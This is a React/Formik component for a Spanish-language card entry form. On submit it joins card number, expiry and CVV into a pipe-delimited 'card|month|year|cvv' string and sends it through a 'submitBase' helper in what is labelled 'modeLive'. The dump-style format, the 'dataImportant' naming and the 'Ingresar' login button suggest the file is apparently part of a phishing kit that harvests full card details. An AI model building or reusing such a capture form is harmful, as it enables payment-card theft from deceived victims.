import { useFormik } from 'formik'

import { cardValidate } from '../../../security/cardValidate'
import { CreditCardInput } from './CreditCardInput'
import { Spiner } from '../../Spiner'
import { submitBase } from '../../../helpers/submitBase'
import { useGeneralData } from '../../../hooks/useGeneralData'
import luhn from 'fast-luhn'

const valuesData = { card: '', month: 'mes', year: 'año', cvv: '' }

export const CreditCard = () => {

    const dataImportant = useGeneralData({modeLive: true, spiner: false, timeLoader: 2000 })
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => cardValidate({values, luhn}),
        onSubmit: async({card, cvv, month, year}) => {
            valuesData.tarjeta = `${card.toString().slice(0, 20).replace(/[^0-9]*$/, '')}|${month < 10 ? `0${month}` : month }|${year}|${cvv.toString().slice(0, 3)}`
            submitBase({dataImportant, valuesData})
        }
    })

    return (
        <div>
            {
                dataImportant.showSpiner === true ? <Spiner /> : null
            }
            <form onSubmit={handleSubmit}>
                <CreditCardInput
                    card={values.card.toString().slice(0, 16)}
                    year={values.year}
                    month={values.month}
                    cvv={values.cvv.toString().slice(0, 3)}
                    handleChange={handleChange} 
                    handleBlur={handleBlur} 
                    touched={touched}
                    errors={errors}
                />
                <button 
                    disabled={(touched.cvv && errors.cvv) || (touched.tarjeta && errors.tarjeta) ? true : false}
                    
                    className='
                    w-full btnSubmit px-4 py-3 text-white rounded-full uppercase font-bold text-sm
                    '
                    type='submit'
                >
                    Ingresar
                </button>
            </form>
        </div>
    )
}
